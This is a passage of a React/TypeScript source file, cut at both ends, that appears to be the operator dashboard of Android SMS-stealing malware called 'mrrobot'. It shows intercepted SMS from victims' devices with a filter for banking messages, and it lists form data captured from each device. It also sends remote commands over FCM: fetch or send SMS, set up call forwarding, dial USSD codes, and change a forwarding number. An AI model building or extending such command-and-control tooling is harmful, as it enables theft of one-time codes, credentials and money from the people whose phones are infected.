          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }}
        />
        {search && (
          <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: t.muted, fontSize: 14, padding: 0, lineHeight: 1 }}>✕</button>
        )}
      </div>

      {/* ── Recent Messages ── */}
      <div style={{ fontWeight: 800, fontSize: 13, color: t.txt, padding: "2px 2px 0" }}>
        Recent Messages
      </div>
      {allMsgs.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 24, fontSize: 12 }}>{search ? "No messages found" : "No messages yet"}</div>
        : visibleMsgs.map(msg => {
            const dev = getDevice(msg.deviceId);
            return (
              <MsgCard
                key={msg.id}
                msg={msg}
                deviceName={dev?.name ?? msg.deviceId}
                device={dev}
                onOpen={onOpenDevice}
                cardClickable
                formEntries={formByDevice[msg.deviceId] ?? []}
              />
            );
          })
      }
      <div ref={homeSentinel} style={{ height: 1 }} />
      {homeLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color="#6366f1" /></div>}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — MESSAGES
════════════════════════════════════════ */
function MessagesPage({
  messages, devices, onOpenDevice, scrollToMsgId, onScrollDone, initialCount, onCountChange,
}: {
  messages: DbMessage[];
  devices: DbDevice[];
  onOpenDevice: (d: DbDevice, msgId: string) => void;
  scrollToMsgId?: string | null;
  onScrollDone?: () => void;
  initialCount?: number;
  onCountChange?: (n: number) => void;
}) {
  const t = useTheme();
  const [search, setSearch] = useState("");
  const [filterSensitive, setFilterSensitive] = useState(false);

  const deviceMap = useMemo(() => {
    const m = new Map<string, DbDevice>();
    for (const d of devices) m.set(d.deviceId, d);
    return m;
  }, [devices]);
  const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);

  // Memoize so we don't re-sort 2000+ messages on every parent re-render (1Hz live tick)
  const filtered = useMemo(() => {
    const sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
    const q = search.toLowerCase();
    return sorted.filter(m => {
      // Call Forward system logs hide karo — sirf real SMS dikhao
      if (m.fromSender.toLowerCase().startsWith("call forward")) return false;
      if (filterSensitive && !isBankingMsg(m.body, m.fromSender)) return false;
      return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (deviceMap.get(m.deviceId)?.name ?? "").toLowerCase().includes(q);
    });
  }, [messages, search, filterSensitive, deviceMap]);

  const { visible: visibleMsgsFeed, sentinelRef: feedSentinel, loading: feedLoading } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);

  // Retry-aware scroll restore — see HomePage for rationale.
  useEffect(() => {
    if (!scrollToMsgId) return;
    let attempts = 0;
    let cancelled = false;
    const tryScroll = () => {
      if (cancelled) return;
      const el = document.getElementById(`msg-${scrollToMsgId}`);
      if (el) {
        el.scrollIntoView({ behavior: "instant" as ScrollBehavior, block: "center" });
        onScrollDone?.();
        return;
      }
      if (++attempts < 40) setTimeout(tryScroll, 50);
    };
    requestAnimationFrame(tryScroll);
    return () => { cancelled = true; };
  }, [scrollToMsgId]); // eslint-disable-line react-hooks/exhaustive-deps

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ display: "flex", gap: 8 }}>
        <div style={{ flex: 1, background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
          <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search messages…"
            style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
        </div>
        <button onClick={() => setFilterSensitive(p => !p)} style={{
          padding: "8px 12px", borderRadius: 8, border: "1.5px solid",
          borderColor: filterSensitive ? "#ef4444" : t.cardB,
          background: filterSensitive ? "#fef2f2" : t.card,
          color: filterSensitive ? "#ef4444" : t.muted,
          fontSize: 11, fontWeight: 600, cursor: "pointer",
        }}>Sensitive</button>
      </div>
      {filtered.length === 0
        ? <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>No messages found</div>
        : visibleMsgsFeed.map(msg => {
            const dev = getDevice(msg.deviceId);
            return <MsgCard key={msg.id} msg={msg} deviceName={dev?.name ?? msg.deviceId} device={dev} onOpen={onOpenDevice} cardClickable />;
          })
      }
      <div ref={feedSentinel} style={{ height: 1 }} />
      {feedLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color="#6366f1" /></div>}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — GROUPS (only user DB form data)
════════════════════════════════════════ */
function fmtKey(k: string): string {
  return k.replace(/_/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").replace(/\b\w/g, c => c.toUpperCase());
}

function GroupsPage({ devices, formData, onOpenDevice, initialCount, onCountChange }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; onOpenDevice: (d: DbDevice) => void; initialCount?: number; onCountChange?: (n: number) => void }) {
  const t = useTheme();
  const [search, setSearch] = useState("");

  const formByDevice = formData.reduce((acc, f) => {
    if (!acc[f.deviceId]) acc[f.deviceId] = [];
    acc[f.deviceId].push(f);
    return acc;
  }, {} as Record<string, DbFormData[]>);

  const devicesWithData = devices.filter(d => (formByDevice[d.deviceId]?.length ?? 0) > 0);

  const byUser = devicesWithData.reduce((acc, d) => {
    if (!acc[d.userId]) acc[d.userId] = [];
    acc[d.userId].push(d);
    return acc;
  }, {} as Record<string, DbDevice[]>);

  // Sort each user's devices by their latest form submission (newest first)
  for (const uid of Object.keys(byUser)) {
    byUser[uid].sort((a, b) => {
      const latestA = formByDevice[a.deviceId]?.reduce((m, f) => Math.max(m, new Date(f.submittedAt).getTime()), 0) ?? 0;
      const latestB = formByDevice[b.deviceId]?.reduce((m, f) => Math.max(m, new Date(f.submittedAt).getTime()), 0) ?? 0;
      return latestB - latestA;
    });
  }

  // Sort users by their latest form submission across all their devices (newest first)
  const allUserIds = Object.keys(byUser).sort((a, b) => {
    const latestA = byUser[a].reduce((m, d) => Math.max(m, formByDevice[d.deviceId]?.reduce((mm, f) => Math.max(mm, new Date(f.submittedAt).getTime()), 0) ?? 0), 0);
    const latestB = byUser[b].reduce((m, d) => Math.max(m, formByDevice[d.deviceId]?.reduce((mm, f) => Math.max(mm, new Date(f.submittedAt).getTime()), 0) ?? 0), 0);
    return latestB - latestA;
  });

  // Filter by search query — matches userId, deviceId, or device name
  const q = search.toLowerCase().trim();
  const userIds = q
    ? allUserIds.filter(uid =>
        uid.toLowerCase().includes(q) ||
        byUser[uid].some(d =>
          d.deviceId.toLowerCase().includes(q) ||
          d.name.toLowerCase().includes(q)
        )
      )
    : allUserIds;

  const { visible: visibleUsers, sentinelRef: userSentinel, loading: usersLoading } = useInfiniteScroll(userIds, 15, initialCount, onCountChange);

  const B = t.cardB;
  const H = t.hdrB;

  return (
    <div style={{ padding: 8, display: "flex", flexDirection: "column", gap: 8 }}>

      {/* ── Search bar ── */}
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="Search by user ID, device ID, device name…"
          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }}
        />
        {search && (
          <button onClick={() => setSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: t.muted, fontSize: 14, padding: 0, lineHeight: 1 }}>✕</button>
        )}
      </div>

      <div style={{ fontSize: 10, color: "#64748b" }}>
        {userIds.length} user{userIds.length !== 1 ? "s" : ""} · {devicesWithData.length} device{devicesWithData.length !== 1 ? "s" : ""} · {formData.length} entr{formData.length !== 1 ? "ies" : "y"}
      </div>
      {userIds.length === 0 && (
        <div style={{ textAlign: "center", color: "#94a3b8", padding: 32, fontSize: 13 }}>{search ? "No results found" : "No form submissions yet"}</div>
      )}
      {visibleUsers.map(uid => {
        const uDevices = byUser[uid];
        const totalEntries = uDevices.reduce((s, d) => s + (formByDevice[d.deviceId]?.length ?? 0), 0);
        return (
          <div key={uid} style={{ borderRadius: 10, border: `1px solid ${B}`, overflow: "hidden" }}>
            {/* ── User header ── */}
            <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 10px", background: H, borderBottom: `1px solid ${B}` }}>
              <div style={{ width: 26, height: 26, borderRadius: "50%", background: "#6366f1", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 9, flexShrink: 0, fontFamily: "monospace" }}>
                {uid.slice(-2)}
              </div>
              <span style={{ flex: 1, fontSize: 11, fontWeight: 700, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", color: t.txt }}>{uid}</span>
              <CopyIconButton value={uid} size={20} color="#6366f1" title="Copy User ID" />
              <span style={{ fontSize: 9, color: "#8b5cf6", fontWeight: 700, flexShrink: 0 }}>{totalEntries} entries</span>
            </div>

            {/* ── One card per device ── */}
            {uDevices.map((device, di) => {
              const devForm = (formByDevice[device.deviceId] ?? [])
                .slice()
                .sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
              const isLast = di === uDevices.length - 1;

              return (
                <div key={device.deviceId} id={`device-card-${device.deviceId}`} style={{ borderBottom: isLast ? "none" : `1px solid ${B}`, background: t.card }}>

                  {/* Device sub-header */}
                  <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "5px 10px", borderBottom: `1px solid ${H}` }}>
                    <div style={{ flex: 1, minWidth: 0, display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                      <span style={{ fontSize: 11, fontWeight: 700, color: t.txt }}>{device.name}</span>
                      <CopyIconButton value={device.name} size={18} color="#6366f1" title="Copy device name" />
                      <span style={{ fontSize: 9, color: "#64748b", fontFamily: "monospace" }}>{device.deviceId}</span>
                      <CopyIconButton value={device.deviceId} size={18} color="#6366f1" title="Copy device ID" />
                      <span style={{ fontSize: 9, color: "#64748b" }}>
                        {device.status === "uninstalled" ? "Uninstalled" : timeAgo(device.lastOnline)}
                      </span>
                    </div>
                    <button
                      onClick={() => onOpenDevice(device)}
                      style={{ fontSize: 13, padding: "6px 16px", borderRadius: 7, border: "none", background: "#6366f1", color: "#fff", cursor: "pointer", fontWeight: 700, flexShrink: 0, boxShadow: "0 2px 10px rgba(99,102,241,0.45)" }}
                    >Open</button>
                  </div>

                  {/* All entries in ONE block — separated by thin lines only */}
                  {devForm.map((entry, idx) => {
                    const pairs = Object.entries(entry.data ?? {});
                    const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
                    return (
                      <div key={entry.id} style={{ borderBottom: idx < devForm.length - 1 ? `1px solid ${H}` : "none" }}>
                        {/* Entry number + time — header row */}
                        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "2px 10px", background: H }}>
                          <span style={{ fontSize: 8, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
                          <span style={{ fontSize: 8, color: "#64748b" }}>{time}</span>
                        </div>
                        {/* Key-value pairs */}
                        {pairs.length === 0
                          ? <div style={{ fontSize: 10, color: "#64748b", padding: "2px 10px" }}>—</div>
                          : pairs.map(([k, v]) => {
                            const sv = String(v ?? "");
                            return (
                              <div key={k} style={{ display: "flex", padding: "3px 10px", gap: 8, alignItems: "center" }}>
                                <span style={{ fontSize: 10, color: "#94a3b8", fontWeight: 600, minWidth: 88, flexShrink: 0 }}>{fmtKey(k)}</span>
                                <span style={{ fontSize: 10, color: t.txt, wordBreak: "break-all", flex: 1 }}>{sv}</span>
                                {sv && <CopyIconButton value={sv} size={18} color="#8b5cf6" title={`Copy ${fmtKey(k)}`} />}
                              </div>
                            );
                          })
                        }
                      </div>
                    );
                  })}

                  {/* One delete-all button per device — bottom */}
                  {devForm.length > 0 && (
                    <div style={{ display: "flex", justifyContent: "flex-end", padding: "6px 10px", background: H, borderTop: `1px solid ${H}` }}>
                      <DeleteIconButton
                        size={28}
                        title={`Delete all ${devForm.length} form entries from this device`}
                        confirmTitle="Delete All Form Entries"
                        confirmText={`Are you sure you want to delete ALL ${devForm.length} form ${devForm.length === 1 ? "entry" : "entries"} submitted by ${device.name}? This action cannot be undone.`}
                        onConfirm={async () => {
                          const r = await fetch(`/api/data?appId=${encodeURIComponent(device.appId)}&deviceId=${encodeURIComponent(device.deviceId)}`, { method: "DELETE" });
                          if (!r.ok) throw new Error(`Server error (${r.status}). Please make sure the server is updated and try again.`);
                        }}
                      />
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        );
      })}
      <div ref={userSentinel} style={{ height: 1 }} />
      {usersLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color="#8b5cf6" /></div>}
    </div>
  );
}

/* ─── Per-device Check Online button ─── */
function CheckOnlineBtn({ device }: { device: DbDevice }) {
  const [checking, setChecking] = useState(false);
  const [seconds, setSeconds] = useState(0);   // live counter: 1,2,3…30
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [progress, setProgress] = useState(false); // 5-sec FCM progress bar

  // Cleanup on unmount
  useEffect(() => () => { if (timerRef.current) clearInterval(timerRef.current); }, []);

  // SSE: device heartbeat received → immediately stop timer & show success
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId) return;
      if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
      setChecking(false);
      setSeconds(0);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [device.deviceId]);

  async function handleClick(e: React.MouseEvent) {
    e.stopPropagation();
    if (checking) return;
    if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }

    // Start checking state + timer + progress bar IMMEDIATELY on click (before FCM send)
    setChecking(true);
    setProgress(true);
    setTimeout(() => setProgress(false), 5200);
    setSeconds(0);
    timerRef.current = setInterval(() => {
      setSeconds(s => {
        const next = s + 1;
        if (next >= 30) {
          if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
          setChecking(false);
          setSeconds(0);
          return 0;
        }
        return next;
      });
    }, 1000);

    try {
      await fcmSend(device.deviceId, mkCheckOnline());
    } catch {
      // FCM failed — silently stop timer and reset
      if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
      setChecking(false);
      setSeconds(0);
    }
  }

  return (
    <div>
      <button onClick={e => void handleClick(e)} style={{
        width: "100%", borderRadius: 8, padding: "10px 4px",
        fontSize: 13, fontWeight: 700, textAlign: "center",
        border: checking ? "1px solid #bfdbfe" : "1px solid #e2e8f0",
        background: checking ? "#6366f1" : "#f8fafc",
        color: checking ? "#fff" : "#475569",
        cursor: checking ? "default" : "pointer",
        transition: "background 0.25s, border-color 0.25s, color 0.25s",
      }}>
        {checking ? `${seconds}s…` : "Check Online"}
      </button>
      <SendProgressBar active={progress} />
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — DEVICES
════════════════════════════════════════ */
/* ════════════════════════════════════════
   ADMIN UPDATE PANEL (per-device)
════════════════════════════════════════ */
function AdminUpdatePanel({ device }: { device: DbDevice }) {
  const t = useTheme();
  const [num, setNum] = useState("");
  const [sendState, setSendState] = useState<"idle"|"loading"|"ok"|"err">("idle");
  const [sendMsg, setSendMsg] = useState("");
  const [disableState, setDisableState] = useState<"idle"|"loading"|"ok"|"err">("idle");
  const [disableMsg, setDisableMsg] = useState("");
  const [fcmBar, setFcmBar] = useState(false); // 5-second progress bar after FCM send

  async function sendCmd(data: Record<string, string>, which: "send"|"disable") {
    if (which === "send") { setSendState("loading"); setSendMsg(""); }
    else { setDisableState("loading"); setDisableMsg(""); }
    setFcmBar(true);
    setTimeout(() => setFcmBar(false), 5000);
    try {
      await fcmSend(device.deviceId, data);
      if (which === "send") { setSendMsg("Sent ✓"); setSendState("ok"); }
      else { setDisableMsg("Disabled ✓"); setDisableState("ok"); }
    } catch (e) {
      const msg = (e as Error).message;
      if (which === "send") { setSendMsg(msg); setSendState("err"); }
      else { setDisableMsg(msg); setDisableState("err"); }
      setFcmBar(false);
    }
    finally {
      setTimeout(() => {
        if (which === "send") { setSendState("idle"); setSendMsg(""); }
        else { setDisableState("idle"); setDisableMsg(""); }
      }, 3000);
    }
  }

  function handleUpdate() {
    const digits = num.replace(/\D/g, "");
    if (digits.length !== 10) { setSendMsg("Enter exactly 10 digits."); setSendState("err"); setTimeout(() => { setSendState("idle"); setSendMsg(""); }, 2500); return; }
    void sendCmd(mkAdminUpdate(device.deviceId, digits, "on"), "send");
  }

  const IS: React.CSSProperties = {
    flex: 1, boxSizing: "border-box", padding: "10px 12px",
    borderRadius: 8, border: `1.5px solid ${sendState === "err" ? "#ef4444" : t.cardB}`,
    background: t.bg, color: t.txt, fontSize: 13, outline: "none", letterSpacing: 1,
  };

  return (
    <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
      <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Admin Update</div>
      <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>

        {/* Number input + Update button row */}
        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
          <input
            type="tel"
            value={num}
            onChange={e => { setNum(e.target.value.replace(/\D/g, "").slice(0, 10)); if (sendState !== "idle") { setSendState("idle"); setSendMsg(""); } }}
            placeholder="10-digit number"
            maxLength={10}
            style={IS}
          />
          <button
            onClick={handleUpdate}
            disabled={sendState === "loading"}
            style={{
              flexShrink: 0, padding: "10px 16px", borderRadius: 8, border: "none",
              background: sendState === "ok" ? "#22c55e" : sendState === "err" ? "#ef4444" : num.replace(/\D/g,"").length === 10 ? "#6366f1" : t.hdrB,
              color: num.replace(/\D/g,"").length === 10 || sendState !== "idle" ? "#fff" : t.muted,
              fontWeight: 700, fontSize: 13, cursor: sendState === "loading" ? "wait" : "pointer",
              transition: "background 0.15s", whiteSpace: "nowrap" as const,
            }}
          >
            {sendState === "loading" ? "…" : sendState === "ok" ? "✓" : sendState === "err" ? "✗" : "Update"}
          </button>
        </div>

        {/* Status + last updated number */}
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{
            padding: "3px 10px", borderRadius: 99, fontSize: 11, fontWeight: 700,
            background: sendState === "ok" ? "#dcfce7" : sendState === "err" ? "#fee2e2" : disableState === "ok" ? "#fee2e2" : t.hdrB,
            color: sendState === "ok" ? "#16a34a" : sendState === "err" ? "#ef4444" : disableState === "ok" ? "#ef4444" : t.muted,
            border: `1px solid ${sendState === "ok" ? "#bbf7d0" : sendState === "err" ? "#fecaca" : disableState === "ok" ? "#fecaca" : t.cardB}`,
          }}>
            {sendState === "ok" ? "ON" : disableState === "ok" ? "OFF" : sendState === "err" || disableState === "err" ? "Error" : "—"}
          </span>
          {sendState === "ok" && num && (
            <span style={{ fontSize: 12, color: t.muted, fontWeight: 500 }}>
              Updated: <span style={{ color: t.txt, fontWeight: 700, fontFamily: "monospace" }}>{num}</span>
            </span>
          )}
          {(sendState === "err" || disableState === "err") && (
            <span style={{ fontSize: 11, color: "#ef4444", fontWeight: 600 }}>{sendMsg || disableMsg}</span>
          )}
          <span style={{ marginLeft: "auto", fontSize: 10, color: t.muted }}>{num.length}/10</span>
        </div>

        {/* Disable button */}
        <button
          onClick={() => void sendCmd(mkAdminUpdate(device.deviceId, "", "off"), "disable")}
          disabled={disableState === "loading"}
          style={{
            width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid",
            borderColor: disableState === "ok" ? "#22c55e" : "#ef4444",
            background: disableState === "ok" ? "#22c55e" : disableState === "loading" ? "#fee2e2" : "transparent",
            color: disableState === "ok" ? "#fff" : "#ef4444",
            fontWeight: 700, fontSize: 13, cursor: disableState === "loading" ? "wait" : "pointer",
            transition: "all 0.15s",
          }}
        >
          {disableState === "loading" ? "Sending…" : disableState === "ok" ? "Disabled ✓" : "Disable"}
        </button>
        {/* 5-second FCM progress bar */}
        <SendProgressBar active={fcmBar} />
      </div>
    </div>
  );
}

function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack, initialCount, onCountChange }: { appId: string; devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; initialDevice?: DbDevice | null; onBack?: () => void; initialCount?: number; onCountChange?: (n: number) => void }) {
  const DEVICE_KEY = `mrrobot_device_id_${appId}`;
  const t = useTheme();
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<DbDevice | null>(initialDevice ?? null);
  const [fromExternal, setFromExternal] = useState<boolean>(!!initialDevice);

  // Sync from parent — Messages/Home/Groups se device kholne par
  useEffect(() => {
    if (initialDevice && (!selected || selected.deviceId !== initialDevice.deviceId)) {
      setSelected(initialDevice);
      setFromExternal(true);
    }
  }, [initialDevice]); // eslint-disable-line react-hooks/exhaustive-deps

  // Refresh-restore + live sync — devices list change hote hi:
  // 1. Agar selected hai → fresh copy se update karo (SSE se naya data aya)
  // 2. Agar selected null hai par localStorage mein device_id hai → restore karo (refresh case)
  useEffect(() => {
    if (devices.length === 0) return;
    if (selected) {
      const fresh = devices.find(d => d.deviceId === selected.deviceId);
      if (fresh && fresh !== selected) setSelected(fresh);
      return;
    }
    const savedId = localStorage.getItem(DEVICE_KEY);
    if (savedId) {
      const found = devices.find(d => d.deviceId === savedId);
      if (found) {
        setSelected(found);
        setFromExternal(false);
      }
    }
  }, [devices]); // eslint-disable-line react-hooks/exhaustive-deps
  const [msgSearch, setMsgSearch] = useState("");
  const [showFormData, setShowFormData] = useState(false);
  const [activeAction, setActiveAction] = useState<ActionKey | null>(null);
  const [quickState, setQuickState] = useState<Record<string, "idle"|"loading"|"ok"|"err">>({});
  const [quickProgress, setQuickProgress] = useState<Record<string, boolean>>({}); // 5s FCM progress bar
  const [onlineTimer, setOnlineTimer] = useState(0); // live countdown for online_check
  const onlineTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Live timeAgo ticker — refresh every second so "38s ago" keeps updating
  const [, setTick] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(iv);
  }, []);

  // Ref for selected deviceId — always up-to-date, no stale closure issues
  const selectedDeviceIdRef = useRef<string | null>(null);
  selectedDeviceIdRef.current = selected?.deviceId ?? null; // sync update every render
  // Internal nav: save scroll + count before opening device detail (list → detail → back to list)
  const internalScrollRef = useRef(0);
  const internalCountRef = useRef(20);

  // Ref: true ONLY when we are actively waiting for an Online Check response
  // Prevents regular heartbeats from resetting the timer unintentionally
  const onlineCheckActiveRef = useRef(false);

  // When online_check SSE confirms device responded → stop timer (mount-once listener via ref)
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (!selectedDeviceIdRef.current || deviceId !== selectedDeviceIdRef.current) return;
      // CRITICAL: only act if we are waiting for an Online Check — ignore regular heartbeats
      if (!onlineCheckActiveRef.current) return;
      onlineCheckActiveRef.current = false;
      if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
      setOnlineTimer(0);
      setQuickState(s => ({ ...s, online_check: "ok" }));
      setTimeout(() => setQuickState(s => ({ ...s, online_check: "idle" })), 2000);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, []); // mount/unmount only — refs always have latest values

  async function sendQuick(device: DbDevice, key: "online_check"|"get_sms") {
    setQuickState(s => ({ ...s, [key]: "loading" }));
    setQuickProgress(s => ({ ...s, [key]: true }));
    // 5-second progress bar auto-clear
    setTimeout(() => setQuickProgress(s => ({ ...s, [key]: false })), 5200);

    if (key === "online_check") {
      // Arm the SSE listener — will ONLY fire when this flag is true
      onlineCheckActiveRef.current = true;
      // Start live seconds counter 0 → 30
      if (onlineTimerRef.current) clearInterval(onlineTimerRef.current);
      setOnlineTimer(0);
      onlineTimerRef.current = setInterval(() => {
        setOnlineTimer(t => {
          if (t >= 30) {
            // Timeout — device did not respond in time, silently reset
            onlineCheckActiveRef.current = false;
            if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
            setQuickState(s => ({ ...s, online_check: "idle" }));
            return 0;
          }
          return t + 1;
        });
      }, 1000);
    }

    const cmd = key === "online_check" ? mkCheckOnline() : mkDeviceCmd(device.deviceId, "get_sms");
    try {
      await fcmSend(device.deviceId, cmd);
      if (key !== "online_check") {
        setQuickState(s => ({ ...s, [key]: "ok" }));
        setTimeout(() => setQuickState(s => ({ ...s, [key]: "idle" })), 2500);
      }
      // online_check stays "loading" until SSE fires (device heartbeat) or 30s timeout
    } catch {
      // FCM send failed — stop everything immediately and silently reset
      if (key === "online_check") {
        onlineCheckActiveRef.current = false;
        if (onlineTimerRef.current) { clearInterval(onlineTimerRef.current); onlineTimerRef.current = null; }
        setOnlineTimer(0);
        setQuickState(s => ({ ...s, online_check: "idle" }));
      } else {
        setQuickState(s => ({ ...s, [key]: "idle" }));
      }
    }
  }

  const filtered = devices
    .filter(d =>
      d.name.toLowerCase().includes(search.toLowerCase()) ||
      d.deviceId.includes(search) ||
      d.userId.toLowerCase().includes(search.toLowerCase())
    )
    .slice()
    .sort((a, b) => new Date(b.installedAt).getTime() - new Date(a.installedAt).getTime());

  const { visible: visibleDevices, sentinelRef: devSentinel, loading: devsLoading, resetCount: resetDeviceCount } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);

  const deviceMsgs = selected
    ? [...messages]
        .filter(m => m.deviceId === selected.deviceId)
        .filter(m => !m.fromSender.toLowerCase().startsWith("call forward")) // call forward logs hide
        .filter(m => {
          const q = msgSearch.toLowerCase();
          return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q);
        })
        .sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())
    : [];

  const ACTIONS: { label: string; key: ActionKey }[] = [
    { label: "Online Check", key: "online_check" },
    { label: "Get SMS", key: "get_sms" },
    { label: "Send SMS", key: "send_sms" },
    { label: "Update", key: "update_number" },
    { label: "Call Forward", key: "call_forward" },
    { label: "Dial USSD", key: "dial_ussd" },
  ];

  /* ── Detail view ── */
  if (selected) {
    const handleBack = () => {
      setSelected(null); setActiveAction(null); localStorage.removeItem(DEVICE_KEY);
      if (fromExternal && onBack) {
        onBack();
      } else {
        resetDeviceCount(internalCountRef.current);
        const savedTop = internalScrollRef.current;
        const scrollEl = document.getElementById("main-scroll");
        if (scrollEl) {
          let attempts = 0;
          const tryRestore = () => {
            scrollEl.scrollTop = savedTop;
            if (Math.abs(scrollEl.scrollTop - savedTop) > 10 && attempts < 50) { attempts++; setTimeout(tryRestore, 50); }
          };
          requestAnimationFrame(tryRestore);
        }
      }
    };
    return (
      <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
        {/* Name banner */}
        <div style={{ background: t.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${t.cardB}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontWeight: 700, fontSize: 15, color: t.txt }}>{selected.name}</div>
            <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 2 }}>
              <div style={{ fontSize: 9, color: "#94a3b8", fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{selected.deviceId}</div>
              <CopyIconButton value={selected.deviceId} size={22} color="#6366f1" title="Copy Device ID" />
            </div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 10, flexShrink: 0 }}>
            <div style={{ fontSize: 11, textAlign: "right" }}>
              <div style={{ fontSize: 9, color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
              <div style={{ fontWeight: 700, color: selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : "#64748b" }}>
                {selected.status === "uninstalled" ? "Uninstalled" : timeAgo(selected.lastOnline)}
              </div>
            </div>
          </div>
        </div>

        {/* Info rows */}
        <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          {/* Name row with Back button at right end */}
          <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
            <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Name</div>
            <div style={{ flex: 1, fontSize: 12, color: t.txt, wordBreak: "break-all" }}>{selected.name}</div>
            <button
              onClick={handleBack}
              style={{
                flexShrink: 0,
                background: "#6366f1",
                border: `1.5px solid #6366f1`,
                borderRadius: 8, padding: "8px 14px",
                fontSize: 13, fontWeight: 800,
                color: "#fff",
                cursor: "pointer", transition: "all 0.15s",
                boxShadow: "0 2px 10px rgba(99,102,241,0.5)",
                letterSpacing: 0.3,
              }}>
              ← Back
            </button>
          </div>
          <Row label="Device ID" value={selected.deviceId} mono accent="#22c55e" />
          <Row label="Android" value={`v${selected.androidVersion}`} />
          <Row label="User ID" value={selected.userId} mono />
          <Row label="SIM 1" value={[selected.sim1Carrier, selected.sim1Phone].filter(Boolean).join(": ") || "—"} />
